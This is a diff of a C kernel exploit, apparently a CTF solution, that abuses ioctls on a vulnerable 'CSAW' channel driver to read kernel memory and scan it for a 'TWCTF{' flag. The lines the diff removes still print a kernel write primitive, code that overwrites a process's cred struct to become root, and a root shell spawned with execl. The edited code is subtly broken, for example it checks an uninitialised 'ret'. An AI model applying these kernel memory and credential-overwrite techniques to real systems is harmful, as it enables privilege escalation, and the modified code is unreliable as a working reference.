@@ -11,7 +11,7 @@
 #include <string.h>
 #include <sys/mman.h>
 
-#define PAGE_SIZE getpagesize()
+#define PAGE_SIZE (getpagesize()*0x1000)
 #define PAGE_OFFSET 0xffff880000000000
 #define BUF_SIZE PAGE_SIZE
 
@@ -111,78 +111,6 @@ int read_kernel_memory ( int fd, int id, unsigned long kaddr, void *buf, unsigne
     return ret;
 }
 
-int write_kernel_null_byte ( int fd, int id, unsigned long kaddr )
-{
-    int ret;
-    char null_byte = 0;
-    struct seek_channel_args seek_channel;
-    struct write_channel_args write_channel;
-
-    /*
-     * The write primitive uses strncpy_from_user(), so we can't write full
-     * dwords containing a null terminator. The exploit only needs to write
-     * zeroes anyhow, so this function just passes a single null byte.
-     */
-
-    memset(&seek_channel, 0, sizeof(seek_channel));
-    seek_channel.id = id;
-    seek_channel.index = kaddr - 0x10;
-    seek_channel.whence = SEEK_SET;
-
-    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);
-
-    memset(&write_channel, 0, sizeof(write_channel));
-    write_channel.id = id;
-    write_channel.buf = &null_byte;
-    write_channel.count = sizeof(null_byte);
-
-    ret = ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
-
-    return ret;
-}
-
-void escalate_creds ( int fd, int id, unsigned long cred_kaddr )
-{
-    unsigned int i;
-    unsigned long tmp_kaddr;
-
-    /*
-     * The cred struct looks like:
-     *
-     *     atomic_t    usage;
-     *     kuid_t      uid;
-     *     kgid_t      gid;
-     *     kuid_t      suid;
-     *     kgid_t      sgid;
-     *     kuid_t      euid;
-     *     kgid_t      egid;
-     *     kuid_t      fsuid;
-     *     kgid_t      fsgid;
-     *
-     * where each field is a 32-bit dword.  Skip the first field and write
-     * zeroes over the id fields to escalate to root.
-     */
-
-    /* Skip usage field */
-
-    tmp_kaddr = cred_kaddr + sizeof(int);
-
-    /* Now overwrite the id fields */
-
-    for ( i = 0; i < (sizeof(int) * 8); i++ )
-        write_kernel_null_byte(fd, id, tmp_kaddr + i);
-}
-
-void gen_rand_str ( char *str, unsigned int len )
-{
-    unsigned int i;
-
-    for ( i = 0; i < (len - 1); i++ )
-        str[i] = (rand() % (0x7e - 0x20)) + 0x20;
-
-    str[len - 1] = 0;
-}
-
 int main ( int argc, char **argv )
 {
     int ret, fd, id;
@@ -192,15 +120,6 @@ int main ( int argc, char **argv )
     struct shrink_channel_args shrink_channel;
     char comm[]= "TWCTF{";
 
-    /* Set comm to random signature */
-
-    srand(time(NULL));
-
-    //gen_rand_str(comm, sizeof(comm));
-
-    //printf("Generated comm signature: '%s'\n", comm);
-
-    //ret = prctl(PR_SET_NAME, comm);
     if ( ret < 0 )
         error("prctl");
 
@@ -289,52 +208,15 @@ int main ( int argc, char **argv )
 
         /* Scan for the comm signature in chunk */
 
-        search = (unsigned long *)addr;
 
-        while ( (unsigned long)search < (unsigned long)ceiling )
-        {
-            search = memmem(search, (unsigned long)ceiling - (unsigned long)search, comm, sizeof(comm));
+        search = memmem(addr, BUF_SIZE, comm, 6);
 
-            if ( search == NULL )
-                break;
-
-            if ( (search[-2] > PAGE_OFFSET) && (search[-1] > PAGE_OFFSET ) )
-            {
-                unsigned long real_cred, cred;
-
-                real_cred = search[-2];
-                cred = search[-1];
-
-                printf("Found comm signature at %p\n", (void *)(kernel_addr + ((char *)search - addr)));
-                printf("read_cred = %p\n", (void *)real_cred);
-                printf("cred = %p\n", (void *)cred);
-
-                /*escalate_creds(fd, id, real_cred);
-
-                if ( cred != real_cred )
-                    escalate_creds(fd, id, cred);
-
-                goto GOT_ROOT;
-                */
-                exit(0);
-            }
-
-            search = (unsigned long *)((char *)search + sizeof(comm));
+        if(search){
+            puts((const char*)search);
         }
+
 
         offset += BUF_SIZE;
     }
-/*
-GOT_ROOT:
-    if ( getuid() != 0 )
-    {
-        printf("Attempted to escalate privileges, but failed to get root\n");
-        exit(EXIT_FAILURE);
-    }
-
-    printf("Got root! Enjoy your shell...\n");
-
-    execl("/bin/sh", "sh", NULL);
-*/
     return 0;
 }
